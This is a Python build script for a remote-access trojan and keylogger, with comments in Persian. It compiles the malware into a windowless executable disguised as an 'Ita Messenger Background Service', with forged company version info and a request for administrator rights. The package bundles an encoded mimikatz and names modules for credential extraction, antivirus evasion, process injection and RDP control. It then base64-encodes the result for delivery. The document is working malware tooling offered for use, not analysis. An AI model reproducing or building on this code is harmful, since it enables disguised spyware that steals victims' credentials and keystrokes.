import os
import subprocess
import logging
import sys
import shutil
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from rat_config import Config

# Configure logging
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class Builder:
    def __init__(self):
        self.spec_file = "KeyloggerClient.spec"
        self.output_dir = "dist"
        self.payload_exe = os.path.join(self.output_dir, "ItaMessengerService.exe")
        self.b64_output = os.path.join(self.output_dir, "ItaMessengerService_b64.txt")
        self.bind_output = os.path.join(self.output_dir, "binded_output.exe")
        self.is_ci = os.getenv('CI') or os.getenv('GITHUB_ACTIONS')

    def _check_icon(self):
        """بررسی وجود فایل آیکون"""
        icon_file = "icon.ico"
        if not os.path.exists(icon_file):
            print(f"Warning: Icon file not found: {icon_file}")
            logging.warning(f"Icon file not found: {icon_file}")
            return False
        else:
            print(f"Icon file found: {icon_file}")
            logging.info(f"Icon file found: {icon_file}")
            return True

    def _create_manifest(self):
        """ایجاد فایل manifest"""
        manifest_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    type="win32"
    name="ItaMessenger.ItaMessengerService"
    version="1.1.0.0"
    processorArchitecture="*"
  />
  <description>Ita Messenger Service</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel 
          level="requireAdministrator" 
          uiAccess="false"
        />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
    </application>
  </compatibility>
</assembly>'''
        
        try:
            with open('manifest.xml', 'w', encoding='utf-8') as f:
                f.write(manifest_content)
            print("Created manifest.xml file")
            return True
        except Exception as e:
            print(f"Failed to create manifest: {str(e)}")
            return False

    def _create_spec_with_version(self):
        """ایجاد spec file با version info"""
        spec_content = '''# -*- mode: python ; coding: utf-8 -*-
import os
import sys
from PyInstaller.utils.hooks import collect_all, collect_data_files
from PyInstaller.utils.win32.versioninfo import (
    VSVersionInfo, FixedFileInfo, StringFileInfo, StringTable,
    StringStruct, VarFileInfo, VarStruct
)

block_cipher = None

# تعریف version info
version_info = VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 1, 0, 1),
    prodvers=(1, 1, 0, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable(
        '040904B0',
        [
          StringStruct('CompanyName', 'Ita Messenger Corporation'),
          StringStruct('FileDescription', 'Ita Messenger Background Service'),
          StringStruct('FileVersion', '1.1.0.1'),
          StringStruct('InternalName', 'ItaMessengerService'),
          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Corporation. All rights reserved.'),
          StringStruct('OriginalFilename', 'ItaMessengerService.exe'),
          StringStruct('ProductName', 'Ita Messenger'),
          StringStruct('ProductVersion', '1.1.0.1'),
          StringStruct('Comments', 'Official Ita Messenger background service for system integration.'),
        ]
      )
    ]),
    VarFileInfo([VarStruct('Translation', [0x409, 1200])])
  ]
)

def get_hidden_imports_and_data():
    hidden_imports = [
        'keyboard', 'pynput', 'pynput.keyboard', 'pynput.mouse', 
        'pynput._util', 'pynput._util.win32',
        'pyautogui', 'PIL', 'PIL.Image', 'PIL.ImageGrab', 'PIL._imaging',
        'psutil', 'psutil._pswindows', 'pyperclip',
        'win32api', 'win32con', 'win32process', 'win32security', 'win32file',
        'win32service', 'win32serviceutil', 'win32event', 'win32evtlog', 
        'win32evtlogutil', 'win32gui', 'win32ui', 'pywintypes', 'winreg',
        'requests', 'urllib3', 'certifi', 'ssl', 'socket',
        'cryptography', 'cryptography.hazmat', 'cryptography.hazmat.primitives',
        'cryptography.hazmat.primitives.ciphers', 
        'cryptography.hazmat.primitives.ciphers.algorithms',
        'cryptography.hazmat.primitives.ciphers.modes', 
        'cryptography.hazmat.backends',
        'cryptography.hazmat.backends.openssl', 
        'cryptography.hazmat.primitives.padding',
        'dotenv', 'packaging', 'packaging.version', 'json', 'base64', 'hashlib',
        'system.file_manager', 'system.collector', 'system.vm_detector', 
        'system.anti_av', 'system.process_injector', 'system.credential_extractor',
        'monitoring.logger', 'monitoring.rdp_controller', 
        'network.communicator', 'encryption.manager', 'commands.handler',
        # اضافه کردن ماژول‌های ضروری برای requests و urllib3
        'http', 'email', 'email.mime', 'email.mime.text', 'email.mime.multipart',
        'email.mime.base', 'email.mime.nonmultipart', 'email.encoders',
        'urllib3.packages.six', 'urllib3.packages.ssl_match_hostname',
        'urllib3.contrib', 'urllib3.contrib.pyopenssl',
        # اضافه کردن ماژول‌های سیستمی
        'tempfile', 're', 'datetime',
    ]
    
    datas = []
    binaries = []
    
    for package in ['cryptography', 'PIL', 'pynput', 'certifi']:
        try:
            pkg_datas, pkg_binaries, pkg_hidden = collect_all(package)
            datas.extend(pkg_datas)
            binaries.extend(pkg_binaries)
            hidden_imports.extend(pkg_hidden)
        except Exception as e:
            print(f"Warning: Could not collect data for {package}: {e}")
    
    return hidden_imports, datas, binaries

hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()

# اضافه کردن manifest به datas
if os.path.exists('manifest.xml'):
    additional_datas.append(('manifest.xml', '.'))

binary_files = [
    ('binaries/mimikatz.b64', '.'),  # قرار دادن در root bundle
]

# یا مستقیم اضافه کنید:
all_datas = additional_datas + [
    ('binaries/mimikatz.b64', '.'),
]

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=additional_binaries,
    datas=all_datas,  # استفاده از all_datas به جای additional_datas
    hiddenimports=hidden_imports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        # فقط ماژول‌های غیرضروری رو exclude کن
        'tkinter', 'unittest', 'xmlrpc', 'pydoc', 'doctest',
        'multiprocessing', 'concurrent', 'test', 'lib2to3', 'distutils',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
    optimize=2,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='ItaMessengerService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='icon.ico' if os.path.exists('icon.ico') else None,
    version=version_info,
)
'''
        try:
            with open('KeyloggerClient_with_version.spec', 'w', encoding='utf-8') as f:
                f.write(spec_content)
            print("Created spec file with complete dependencies")
            return 'KeyloggerClient_with_version.spec'
        except Exception as e:
            print(f"Failed to create spec file: {str(e)}")
            return self.spec_file

    def _clean_build_dirs(self):
        """پاکسازی دایرکتوری‌های build"""
        dirs_to_clean = ['build', 'dist', '__pycache__']
        files_to_clean = ['version_info.py', 'wrapper.py', 'KeyloggerClient_with_version.spec', 'manifest.xml']
        
        for dir_name in dirs_to_clean:
            if os.path.exists(dir_name):
                try:
                    shutil.rmtree(dir_name)
                    print(f"Cleaned directory: {dir_name}")
                except Exception as e:
                    print(f"Warning: Could not clean {dir_name}: {str(e)}")
        
        for file_name in files_to_clean:
            if os.path.exists(file_name):
                try:
                    os.remove(file_name)
                    print(f"Cleaned file: {file_name}")
                except Exception as e:
                    print(f"Warning: Could not clean {file_name}: {str(e)}")

    def install_requirements(self):
        """Install dependencies from requirements.txt if it exists."""
        requirements_file = "requirements.txt"
        try:
            if os.path.exists(requirements_file):
                print(f"Installing dependencies from {requirements_file}...")
                logging.info(f"Installing dependencies from {requirements_file}...")
                
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", "-r", requirements_file], 
                    capture_output=True, 
                    text=True,
                    check=False
                )
                
                if result.returncode == 0:
                    print("Dependencies installed successfully")
                    logging.info("Dependencies installed successfully")
                else:
                    print(f"Dependency installation warnings: {result.stderr}")
                    logging.warning(f"Dependency installation warnings: {result.stderr}")
            else:
                print(f"{requirements_file} not found, skipping dependency installation")
                logging.warning(f"{requirements_file} not found, skipping dependency installation")
        except Exception as e:
            print(f"Failed to install dependencies: {str(e)}")
            logging.error(f"Failed to install dependencies: {str(e)}")

    def build_payload(self):
        """Build the source code into an executable using spec file."""
        try:
            print("Building payload with PyInstaller using spec file...")
            logging.info("Building payload with PyInstaller using spec file...")
    
            # ایجاد manifest و spec file
            self._create_manifest()
            spec_file_to_use = self._create_spec_with_version()
    
            # Check for icon
            self._check_icon()
    
            # Create output directory if it doesn't exist
            os.makedirs(self.output_dir, exist_ok=True)
    
            # Build using spec file
            pyinstaller_cmd = [
                "pyinstaller",
                "--noconfirm",
                "--clean",
                spec_file_to_use
            ]
            
            print(f"Executing PyInstaller with spec file: {spec_file_to_use}")
            logging.debug(f"PyInstaller command: {' '.join(pyinstaller_cmd)}")
            
            result = subprocess.run(
                pyinstaller_cmd, 
                capture_output=True, 
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=300
            )
            
            if result.returncode != 0:
                print(f"PyInstaller failed with exit code {result.returncode}")
                if result.stdout:
                    print(f"PyInstaller stdout: {result.stdout[-500:]}")
                if result.stderr:
                    print(f"PyInstaller stderr: {result.stderr[-500:]}")
                raise Exception(f"PyInstaller failed with exit code {result.returncode}")
            
            print("PyInstaller completed successfully")

            # Check if executable was created
            if not os.path.exists(self.payload_exe):
                alt_paths = [
                    os.path.join("dist", "ItaMessengerService", "ItaMessengerService.exe"),
                    os.path.join("dist", "ItaMessengerService.exe")
                ]
                
                for alt_path in alt_paths:
                    if os.path.exists(alt_path):
                        shutil.move(alt_path, self.payload_exe)
                        dir_path = os.path.dirname(alt_path)
                        if dir_path != self.output_dir and os.path.exists(dir_path):
                            shutil.rmtree(dir_path)
                        break
                else:
                    raise Exception(f"Payload executable not found: {self.payload_exe}")
            
            # Get file size
            file_size = os.path.getsize(self.payload_exe)
            file_size_mb = file_size / (1024 * 1024)
            
            print(f"Payload built successfully: {self.payload_exe}")
            print(f"File size: {file_size_mb:.2f} MB")
            print("Version info embedded successfully")
            
            # بررسی version info
            try:
                with open(self.payload_exe, 'rb') as f:
                    header = f.read(2)
                    if header == b'MZ':
                        print("Executable header is valid (MZ signature)")
                    else:
                        print("Warning: Executable header may be invalid")
            except Exception as e:
                print(f"Warning: Could not validate executable: {str(e)}")
            
            logging.info(f"Payload built successfully with version info: {self.payload_exe} ({file_size_mb:.2f} MB)")

        except subprocess.TimeoutExpired:
            error_msg = "PyInstaller timed out after 5 minutes"
            print(f"{error_msg}")
            logging.error(error_msg)
            raise Exception(error_msg)
        except Exception as e:
            print(f"Build error: {str(e)}")
            logging.error(f"Build error: {str(e)}")
            raise Exception(f"Failed to build payload: {str(e)}")

    def encode_payload_to_base64(self):
        """Encode the built payload executable to Base64."""
        try:
            print(f"Encoding payload to Base64: {self.payload_exe}")
            logging.info(f"Encoding payload to Base64: {self.payload_exe}")

            if not os.path.exists(self.payload_exe):
                raise Exception(f"Payload executable not found: {self.payload_exe}")

            with open(self.payload_exe, 'rb') as f:
                binary_data = f.read()
                b64_encoded = base64.b64encode(binary_data).decode('utf-8')

            with open(self.b64_output, 'w', encoding='utf-8') as f:
                f.write(b64_encoded)
            
            file_size = len(b64_encoded) / 1024
            print(f"Base64-encoded payload saved to: {self.b64_output}")
            print(f"Base64 size: {file_size:.2f} KB")
            logging.info(f"Base64-encoded payload saved to: {self.b64_output} ({file_size:.2f} KB)")

        except Exception as e:
            print(f"Base64 encoding error: {str(e)}")
            logging.error(f"Base64 encoding error: {str(e)}")
            raise Exception(f"Failed to encode payload to Base64: {str(e)}")

    def run(self):
        """Run the build process with user interaction for local execution."""
        root = None
        try:
            print("=" * 60)
            print("Starting Build Process (With Version Info)...")
            print("=" * 60)
            
            print("\nCleaning previous build files...")
            self._clean_build_dirs()
            
            print("\nInstalling dependencies...")
            self.install_requirements()

            print("\nBuilding payload with version info...")
            self.build_payload()

            print("\nEncoding payload to Base64...")
            self.encode_payload_to_base64()

            print("\n" + "=" * 60)
            print("Build completed successfully with Version Info!")
            print("=" * 60)
            print(f"Output: {self.payload_exe}")
            print(f"Base64: {self.b64_output}")
            
            if os.path.exists(self.payload_exe):
                size = os.path.getsize(self.payload_exe) / (1024 * 1024)
                print(f"File size: {size:.2f} MB")
            print("Company: Ita Messenger Corporation")
            print("Description: Ita Messenger Background Service")
            print("Requires: Administrator privileges")
            print("=" * 60)

            if not self.is_ci:
                print("\nVersion info successfully embedded in executable!")
                print("Check with: python check_version.py")

        except Exception as e:
            error_msg = f"Build process failed: {str(e)}"
            print(f"\n{error_msg}")
            logging.error(error_msg)
            
            if not self.is_ci:
                try:
                    messagebox.showerror("Build Error", error_msg)
                except:
                    pass
            
            raise Exception(error_msg)

def main():
    """تابع اصلی برای اجرای build process"""
    try:
        if Config.TEST_MODE:
            print("Test mode enabled: Skipping actual build process.")
            print(f"Enabled features: {Config.get_behavior_config()}")
        else:
            builder = Builder()
            builder.run()
    except KeyboardInterrupt:
        print("\nBuild process interrupted by user")
    except Exception as e:
        print(f"\nFatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()